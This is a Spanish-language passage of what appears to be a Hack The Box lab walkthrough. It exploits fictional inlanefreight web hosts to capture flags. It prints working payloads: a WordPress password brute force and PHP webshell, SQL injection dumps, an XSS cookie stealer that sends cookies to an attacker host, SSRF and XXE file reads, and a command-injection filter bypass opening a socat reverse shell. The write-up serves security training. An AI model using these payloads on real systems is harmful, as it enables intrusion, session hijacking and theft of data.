200      GET       73l      133w     2048c http://dev.inlanefreight.local/index.php
200      GET      877l     4943w   438950c http://dev.inlanefreight.local/images/icons/photo.png
301      GET        9l       28w      336c http://dev.inlanefreight.local/uploads => http://dev.inlanefreight.local/uploads/
301      GET        9l       28w      335c http://dev.inlanefreight.local/images => http://dev.inlanefreight.local/images/
200      GET        1l        2w       14c http://dev.inlanefreight.local/upload.php
301      GET        9l       28w      332c http://dev.inlanefreight.local/css => http://dev.inlanefreight.local/css/
200      GET       79l      121w     1367c http://dev.inlanefreight.local/css/main.css
200      GET       17l      140w    11959c http://dev.inlanefreight.local/images/logo.png
200      GET       73l      133w     2048c http://dev.inlanefreight.local/
200      GET        7l     1513w   144877c http://dev.inlanefreight.local/css/bootstrap.css
301      GET        9l       28w      331c http://dev.inlanefreight.local/js => http://dev.inlanefreight.local/js/
200      GET       31l       88w     1161c http://dev.inlanefreight.local/js/main.js
200      GET        5l      351w    19188c http://dev.inlanefreight.local/js/popper.js
200      GET        7l      567w    48944c http://dev.inlanefreight.local/js/bootstrap.min.js
200      GET        4l     1058w    69597c http://dev.inlanefreight.local/js/slim.min.js
200      GET        1l        1w       38c http://dev.inlanefreight.local/flag.txt
```

Además podríamos realizar la técnica de HTPP Verb Tampering que hemos visto más arriba en esta sección, pero lo omitiremos ya que el objetivo era obtener la flag.

### Pregunta 3

> Aprovecha la instancia de WordPress y encuentra una flag en la raíz web. Envía el valor de la flag como respuesta

#### ir.inlanefreight.local

Tenemos la siguiente web en Wordpress:

<figure><img src="/files/3Kww9ABcq2RSpgX54fzY" alt=""><figcaption></figcaption></figure>

#### Enumeración de Wordpress

```shell-session
afsh4ck@kali$ sudo wpscan --url http://ir.inlanefreight.local --enumerate                                                           
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://ir.inlanefreight.local/ [10.129.229.147]
[+] Started: Mon Apr  7 21:10:11 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.53 (Debian)
 |  - X-Powered-By: PHP/7.4.29
 |  - Via: 1.1 ir.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://ir.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://ir.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 
 [+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Last Updated: 2024-03-13T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | [!] The version is out of date, the latest version is 0.9
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'
 
 [i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Obtenemos 4 usuarios válidos. El que más nos llama la atención (por ser el más destacado con más info) es el usuario ilfreightwp, por lo que haremos un bruteforce:

```shell-session
afsh4ck@kali$ sudo wpscan --password-attack xmlrpc -t 20 -U ilfreightwp -P /usr/share/wordlists/rockyou.txt --url http://ir.inlanefreight.local
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://ir.inlanefreight.local/ [10.129.229.147]
[+] Started: Mon Apr  7 21:15:24 2025

Interesting Finding(s):

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                                            
Trying ilfreightwp / 123123 Time: 00:00:00 <            > (40 / 14344432)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1
```

Tenemos la contraseña! Vamos a acceder por `/wp-admin`.  Una vez iniciada la sesión, se nos dirigirá a `http://ir.inlanefreight.local/wp-admin/` donde podemos editar el archivo `404.php` del tema inactivo `Twenty Twenty One` y agregar un webshell PHP para ejecutar código remoto.

<figure><img src="/files/rxEw6V7xH605Cji8CgHG" alt=""><figcaption></figcaption></figure>

#### Acceso por curl

```bash
curl http://ir.inlanefreight.local/wp-content/themes/twentytwentyone/404.php\?0\=id  

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Búsqueda de la flag en WordPress

```bash
curl "http://ir.inlanefreight.local/wp-content/themes/twentytwentyone/404.php?0=find%20/%20-name%20flag.txt%202>/dev/null"

/var/www/html/flag.txt
```

#### Acceso a la flag

```bash
curl "http://ir.inlanefreight.local/wp-content/themes/twentytwentyone/404.php?0=cat%20/var/www/html/flag.txt"

HTB{e7134abea7438e937b87608eab*******}
```

{% hint style="success" %}
O también podríamos usar el método con una reverse shell y movernos dentro del objetivo, un poco más cómodo para evitar el URL encoding de los espacios.
{% endhint %}

### Pregunta 4

> Enumere la base de datos "status" y recupere la contraseña del usuario "Flag". Envíe el valor como respuesta.

#### status.inlanefreight.local

Al probar una comilla simple vemos que es vulnerable a SQL Injection, ya que da un error de SQL en el front:

<figure><img src="/files/TTA7sS8266IkPhYX7p2m" alt=""><figcaption></figcaption></figure>

Podemos explotar esto manualmente con un payload como:

```sql
' union select null, database(), user(), @@version -- //
```

Este es un ejemplo de un [ataque UNION de inyección SQL](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/sql-injection.md) .

<figure><img src="/files/9J0ufmvPvFbEgOOXLCsN" alt=""><figcaption></figcaption></figure>

También podemos usar sqlmap para aprovechar esto. Primero, capturamos la solicitud POST con Burp, la guardamos en un archivo y marcamos el parámetro `searchitem` con un `*` para que sqlmap sepa dónde inyectar.

<figure><img src="/files/FMBG3ufEqnLBld9tujfE" alt=""><figcaption></figcaption></figure>

#### Enumeración de bases de datos

```shell-session
$ sqlmap -r sqli.txt --dbms=mysql --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:48:09 /2025-04-07/

[21:48:09] [INFO] parsing HTTP request from 'sqli.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
[21:48:11] [INFO] testing connection to the target URL
[21:48:11] [INFO] testing if the target URL content is stable
<----SNIP---->
---
[21:49:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[21:49:09] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys
```

#### Enumeración de la base de datos status

```shell-session
$ sqlmap -r sqli.txt --dbms=mysql -D status --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:49:53 /2025-04-07/

[21:49:53] [INFO] parsing HTTP request from 'sqli.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
[21:49:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
[21:49:58] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+
```

#### Dumpear tabla users

```shell-session
$ sqlmap -r sqli.txt --dbms=mysql -D status -T users --dump

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:51:09 /2025-04-07/

[21:51:09] [INFO] parsing HTTP request from 'sqli.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
[21:51:11] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

[21:51:11] [INFO] fetching entries for table 'users' in database 'status'
Database: status
Table: users
[2 entries]
+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c3****** | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387e****** | Flag     |
+----+-----------------------------------+----------+
```

### Pregunta 5

> Roba la cookie de sesión de un administrador y accede a la cola de tickets de soporte. Envia el valor de la flag del usuario "John" como respuesta.

#### support.inlanefreight.local

Al explorar la aplicación, encontramos la página `/ticket.php` donde podemos generar un ticket de soporte.&#x20;

<figure><img src="/files/JrnSgmEcFQN8rg0bv9JY" alt=""><figcaption></figcaption></figure>

Completamos todos los datos del ticket e incluímos lo siguiente en el campo `Message`:

```javascript
 "><script src=http://10.10.14.53:9000/TEST</script>
```

Iniciamos un listener `Netcat` en el puerto 9000. Hacemos clic en el botón `Send` y comprobamos si el receptor recibe una llamada para confirmar la vulnerabilidad.

<figure><img src="/files/CuKEpSOC9No7pPDVX9Lj" alt=""><figcaption></figcaption></figure>

Este es un ejemplo de un ataque [Blind Cross Site Scripting (XSS).](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/cross-site-scripting-xss.md)

Ahora necesitamos averiguar cómo podemos robar la cookie de un administrador para poder iniciar sesión y ver qué tipo de acceso podemos obtener. Podemos hacerlo creando los siguientes dos archivos:

{% code title="index.php" %}

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

{% endcode %}

{% code title="script.js" %}

```javascript
new Image().src='http://10.10.14.53:9200/index.php?c='+document.cookie
```

{% endcode %}

A continuación, iniciamos un servidor web PHP en nuestro host de atacante de la siguiente manera:

```bash
sudo php -S 0.0.0.0:9200
```

Por último, creamos un nuevo ticket y enviamos lo siguiente en el campo de mensaje:

```javascript
"><script src=http://10.10.14.53:9200/script.js></script>
```

Recibimos una devolución de llamada en nuestro servidor web con una cookie de sesión de administrador:

<figure><img src="/files/8jFAvUbiiyhDMLxNNbcB" alt=""><figcaption></figcaption></figure>

```shell-session
afsh4ck@kali$ sudo php -S 0.0.0.0:9200

[Tue Apr  8 21:38:23 2025] PHP 8.2.24 Development Server (http://0.0.0.0:9200) started
[Tue Apr  8 21:39:30 2025] 10.129.221.126:44558 Accepted
[Tue Apr  8 21:39:30 2025] 10.129.221.126:44558 [200]: GET /script.js
[Tue Apr  8 21:39:30 2025] 10.129.221.126:44558 Closing
[Tue Apr  8 21:39:31 2025] 10.129.221.126:44560 Accepted
[Tue Apr  8 21:39:31 2025] 10.129.221.126:44560 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

<----SNIP---->
```

A continuación, podemos utilizar un plugin de Firefox como [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org\&utm_medium=referral\&utm_content=search) para iniciar sesión utilizando la cookie de sesión del administrador. Como la cookie va precedida del ID session le pondremos el mismo nombre:

<figure><img src="/files/a6JoTWMvDyiy4X6SkpN3" alt=""><figcaption></figcaption></figure>

Guardamos, pulsamos en login, recargamos la página y buuum, accedemos como admin!

<figure><img src="/files/P5YdbRGfelcWSmeSmrdm" alt=""><figcaption></figcaption></figure>

### Pregunta 6

> Usa la vulnerabilidad SSRF para leer archivos locales para encontrar una flag. Envía el valor de la flag como respuesta.

#### tracking.inlanefreight.local

El sitio `http://tracking.inlanefreight.local/` nos permite ingresar un número de seguimiento y recibir un PDF con el estado de nuestro pedido.&#x20;

<figure><img src="/files/Hl1p65gDpW7vYyVkItGr" alt=""><figcaption></figcaption></figure>

La aplicación toma la información del usuario y genera un documento PDF. Al generar el PDF, podemos ver que el campo `Tracking #:` acepta cualquier información (no solo números) que especifiquemos en el cuadro de búsqueda antes de hacer clic en el botón `Track Now`. Si insertamos un payload JavaScript simple como `<script>document.write('TESTING THIS')</script>` y hacemos click en `Track Now`, vemos que se genera el PDF y se muestra el mensaje `TESTING THIS`, lo que parece indicar que el código JavaScript se ejecuta cuando el servidor web genera el documento.

<figure><img src="/files/tJhnAZqQuKF7h2SoRGHd" alt=""><figcaption></figcaption></figure>

Podemos usar este payload para probar la lectura de archivos, primero probando el archivo `/etc/passwd`, que es legible para todo el mundo:

```javascript
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

Pegamos el payload en el cuadro de búsqueda y presionamos el botón `Track Now` y el PDF recién generado nos muestra el contenido del archivo, ¡así que hemos leído el archivo local!

![texto](https://academy.hackthebox.com/storage/modules/163/ssrf_file_read.png)

Después de probar varias rutas donde podría estar la flag la encontré usando este payload:

```javascript
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///flag.txt");
	x.send();
	</script>
```

<figure><img src="/files/EUC6FEzSEYOWCloh0ZNm" alt=""><figcaption></figcaption></figure>

### Pregunta 7

> Crea una cuenta e inicia sesión en la instancia de Gitlab. Envía el valor de la flag.

#### gitlab.inlanefreight.local

<figure><img src="/files/KhMAhKFtuQBCw54ocnsx" alt=""><figcaption></figcaption></figure>

Una vez que nos creamos la cuenta en Explore projects nos encontramos la flag:

<figure><img src="/files/X6Ly64j4KdCdbfoXw8Gd" alt=""><figcaption></figcaption></figure>

Además encontramos otro host shopdev2.inlanefreight.local que añadiremos al `/etc/hosts`.

### Pregunta 8

> Usa la vulnerabilidad XXE para encontrar una flag. Envía el valor de la bandera como respuesta.

#### shopdev2.inlanefreight.local

Al acceder llegamos a un login:

<figure><img src="/files/x3QrblM0ni3sdZNfXn3v" alt=""><figcaption></figcaption></figure>

Probando las credenciales por defecto `admin:admin` (lo común en un entorno de desarrollo) conseguimos acceder:

<figure><img src="/files/JtWCKWcplakfSG1NgRGN" alt=""><figcaption></figcaption></figure>

Las páginas más interesantes serían `/contact.php` y `/cart.php`. Al hacer click en `Complete purchase` y capturarlo con BurpSuite, vemos que se realiza una solicitud `POST XML` en el cuerpo:

<figure><img src="/files/b640Mj7UDZgLEB1DEVuj" alt=""><figcaption></figcaption></figure>

#### Explotación de XXE

Al usar este payload conseguimos la lactura del archivo `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

<figure><img src="/files/LdtOgXrJARYy7lPaCLID" alt=""><figcaption></figcaption></figure>

Modificando el payload de la siguiente manera accedemos a la flag:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///flag.txt">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

<figure><img src="/files/h175yesbHqA6Yz4Mr6qe" alt=""><figcaption></figcaption></figure>

### Pregunta 9

> Usa la vulnerabilidad de Command Injection para encontrar una flag en el web root. Envía el valor de la flag como respuesta.

#### monitoring.inlanefreight.local

<figure><img src="/files/7vlQ2AoaPYAW0erts6TB" alt=""><figcaption></figcaption></figure>

#### Bruteforce de login con hydra

Al introducir las credenciales por defecto `admin:admin` nos da el error `Invalid Credentials!`, por lo que lo usaremos para configurar el bruteforce:

<figure><img src="/files/RujNF9NWnvvBPSDxaUcP" alt=""><figcaption></figcaption></figure>

```shell-session
afsh4ck@kali$ hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt monitoring.inlanefreight.local http-post-form '/login.php:username=admin&password=^PASS^:Invalid Credentials!'

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-09 20:02:59
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
```

Conseguimos la contraseña y accedemos correctamente.

<figure><img src="/files/QsU8nZmOOwv97c9rDAIz" alt=""><figcaption></figcaption></figure>

Es un entorno ciertamente restringido donde no podemos movernos a otros directorios con `cd`. Con el comando `help` vemos que tenemos una funcionalidad interesante de `connection_test`. Al capturar la petición con Burp Suite vemos que hace un ping a la ip `127.0.0.1`:

<figure><img src="/files/uHrzpA4FUO5IZnppRX0o" alt=""><figcaption></figcaption></figure>

Podemos inferir que el script `/ping.php` está ejecutando un comando operativo mediante una función PHP como , `shell_exec(ping -c 1 127.0.0.1)`o similar, utilizando la función [system()](https://www.php.net/manual/en/function.system.php) para ejecutar un comando. Si este script está mal codificado, podría fácilmente resultar en una vulnerabilidad de inyección de comandos, así que probemos algunos payloads comunes.

#### Evasión de filtros

Podemos evadir los filtros de espacios con el siguiente payload:

```http
GET /ping.php?ip=127.0.0.1%0a'i'd
```

<figure><img src="/files/XEQ04T2wwIGE1OcDgaUB" alt=""><figcaption></figcaption></figure>

#### Conseguir una reverse shell

Si regresamos a Burp y realizamos la solicitud `GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php`, podemos ver que la mayoría de las opciones para obtener una reverse shell están filtradas:

<figure><img src="/files/HRxESQZLr6Q5zrMviim5" alt=""><figcaption></figcaption></figure>

Sin embargo, una que no lo está es `socat`. Comprobemos si está disponible en el sistema. Al regresar a Burp y usar la solicitud, `GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat` vemos que está disponible en el sistema, en  `/usr/bin/socat`.

<figure><img src="/files/u1loN9o6j2pchnF9nK5L" alt=""><figcaption></figcaption></figure>

#### Ganando una shell con socat

Abrimos un listener de Netcat en nuestro Kali Linux:

```shell-session
afsh4ck@kali$ nc -nlvp 8443
listening on [any] 8443 ...
```

Y usaremos el siguiente payload para ejecutar Socat en Burp Repeater:

```
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.248:8443${IFS}EXEC:bash HTTP/1.1
```

<figure><img src="/files/X59I8i3c97iRAyg9GAKL" alt=""><figcaption></figcaption></figure>

Tenemos una shell! Vamos a buscar la flag.

#### TTY Spawn Shell

Cuando obtenemos una shell básica que **no tiene prompt, tab-autocompletado, ni CTRL+C funcionando**, estás en lo que llamamos una **shell "dumb"** o **pseudo-TTY**. Activaremos una TTY interactiva para tener un poco más de control sobre el entorno

```shell-session
python3 -c 'import pty;pty.spawn("/bin/bash")'

webdev@dmz01:/var/www/html/monitoring$ export TERM=xterm
```

```shell-session
webdev@dmz01:/var/www/html/monitoring$ ls
00112233_flag.txt  css  img  index.php  js  login.php  ping.php

webdev@dmz01:/var/www/html/monitoring$ cat 00112233_flag.txt
HTB{bdd8a93aff53fd63a0a14de4**********}
```

En este punto reportaremos la vulnerabilidad `Command Injection` de riesgo `Critical`.
